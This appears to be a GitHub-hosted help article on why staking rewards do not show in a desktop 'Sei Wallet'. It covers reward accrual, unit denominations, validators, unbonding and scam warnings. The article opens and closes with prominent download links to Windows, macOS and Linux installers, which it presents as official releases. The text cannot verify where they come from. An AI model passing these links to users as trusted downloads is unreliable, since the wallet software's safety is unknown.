![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">Staking rewards not showing in Sei Wallet</h1>

<p align="center">Where rewards actually accrue, and why the balance can look unchanged.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Staking rewards do not appear in your spendable balance. They accrue to the bonded position, they are usually claimed separately, and until you claim them they exist in a place most balance displays never show. That single fact explains the majority of "my rewards disappeared" reports.

The rest divide into four causes: no bonded position on the account you are looking at, a validator earning nothing for you, a position that is already unbonding, and a denomination that makes a real number look like a wrong one.

## Accrued, claimed and bonded are three different things

Worth fixing in your head before troubleshooting:

- **Bonded** is the staked amount. It is yours, it is not spendable, and it is what earns.
- **Accrued rewards** are earned but unclaimed. They sit against the delegation and are visible in the staking view, not in your available balance.
- **Claimed rewards** become liquid SEI in your available balance, and stop being "rewards" at that point.

So the check is not "is my balance bigger" but "does the staking view show a claimable amount". If it does, nothing is wrong — you have simply not claimed yet.

## The denomination trap

This one produces reports of life-changing windfalls and of missing funds, both wrong.

SEI exists in two unit conventions: 18 decimals on the EVM side, and 6 decimals as `usei` on the Cosmos side. A reward that is `0.004` SEI can therefore appear in a view that reports base units as `4000`. Neither number is wrong; they are the same amount expressed at different scales.

If a figure looks a thousand or a trillion times too large or too small, suspect the unit before suspecting the app. The same confusion applies to balances and to the amounts shown in transaction details.

## Cause 1: no bonded position on the account you are looking at

A wallet with several accounts shows rewards per account, and adding an account does not copy a position into it. Check that the account selector is on the account that holds the delegation.

The subtler version is the address form. One account has two written forms, and a view of the `sei1…` side may show a position that the `0x…` side does not surface the same way. If you have just restored or migrated, [the address mapping](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) is the first thing to confirm.

## Cause 2: the validator is not earning for you

Rewards come from the validator's performance, so a delegation to a validator that is offline, jailed or barely producing blocks earns little or nothing. Two further details:

- **Commission takes a cut before you see anything.** A validator at a high commission can leave you with a very small net figure.
- **Rewards accrue per block, continuously.** A validator that has just come back online does not retroactively pay for the downtime.

Switching validators is a normal operation, and it does not require unbonding: redelegation keeps the position bonded. The mechanics, including the chain's limits on how often you can do it, are in [the staking setup](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).

## Cause 3: the position is unbonding

An unbonding position earns nothing. The moment the unbonding transaction confirms, rewards stop, and the entry in the unbonding list shows the amount and the completion time rather than a growing reward figure.

This is by design, and it is why claiming before you exit matters: rewards accrued up to that point are claimable, but no new ones accumulate while you wait. [The unbonding wait](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md) covers the timing and the one trap that matters — a fully bonded account cannot pay the fee to start its own exit.

## Cause 4: the app is on another network

Testnet has validators, delegations and rewards of its own, denominated in test tokens. A wallet pointed at chain 1328 will show a testnet position, or none at all, while your mainnet delegation sits on 1329. If the numbers look wrong in a way that has nothing to do with your history, confirm the network before anything else.

## Claiming, and what happens next

Claiming is a transaction, so it costs a network fee, and it needs the device confirmation if a hardware wallet is attached. Three consequences people miss:

- **Claiming does not restake.** Claimed rewards become liquid; if you want them working, delegate them again as a separate transaction.
- **A claim can fail for the ordinary reasons** — insufficient liquid balance for the fee, or a stale network view. A failed claim moves nothing.
- **Tiny rewards can cost more to claim than they are worth.** If the claimable amount is smaller than the fee, waiting and claiming less often is the rational choice.

The claimable figure and the claim control live in the app's staking section, and [the app's staking view](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is the place to start if you have not opened it before.

## If you have just migrated or restored

Two migration-specific cases produce "missing rewards" that are not missing:

**Restored into a new wallet, same phrase.** Restoring reproduces the accounts the phrase controls, so the delegation and its accrued rewards should appear once the right account is open. If they do not, you are probably looking at a different derivation rather than a lost position.

**Imported from a Cosmos-style wallet.** A position held under the Cosmos derivation may be visible but not actionable in an EVM-first wallet, and rewards with it. Seeing it is not the same as being able to claim it, and the distinction between reading an account and being able to act on it is covered in [what a read-only view can and cannot do](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).

## The scams that target this exact question

"Rewards not showing" is a search that attracts predators, because it implies a user who believes something is owed to them.

- **A site that offers to "recover" or "unlock" your staking rewards** is collecting seed phrases. Rewards are claimed by you, from your account, with a signature.
- **A fake airdrop** that asks you to connect a wallet and sign a "claim" can drain an account through an approval rather than a transfer. Read what the prompt asks for.
- **A direct message offering to "check your delegation"** needs nothing from you: delegation is public. Anyone asking for more is setting up the next step.

No legitimate process needs your phrase to show you a reward balance. That is the whole test.

## A short diagnostic sequence

1. Confirm the network (1329 mainnet).
2. Confirm the account, then confirm which address form you are viewing.
3. Open the staking view and look for a claimable amount, not for a change in available balance.
4. Check the validator's status and commission.
5. Check whether the position is still bonded.
6. Only then consider that something is wrong.

Steps 1 to 5 resolve nearly every report, and none of them requires support.

## Frequently asked questions

**Why are my staking rewards not showing in my balance?** Because they accrue to the bonded position and are claimed separately. Look for a claimable figure in the staking view, not in your spendable balance.

**Do rewards compound automatically?** No. Claimed rewards become liquid and stay liquid until you delegate them again.

**Do I lose rewards when I unstake?** Rewards stop accruing when the unbonding transaction confirms. Anything accrued before that remains claimable, so claim first if you want it.

**Why is the number so large?** Likely base units rather than SEI. The two unit conventions differ by a factor of a trillion, so a `0.004` SEI reward can read as `4000` in a view that reports the smallest unit.

**Can rewards be recovered if I lose access?** Access is the seed phrase. Without it there is no account to claim from, and no operator-side route — which is the reason the phrase is worth protecting more carefully than the balance.

**Is claiming free?** No. It is a transaction with a network fee, so small rewards are sometimes not worth claiming immediately.

**Does switching validators lose my rewards?** Redelegating keeps the position bonded and the accrued rewards with it. Unstaking stops accrual and starts the unbonding clock.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [Unstaking SEI in Sei Wallet: the unbonding wait and stuck unstakes](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
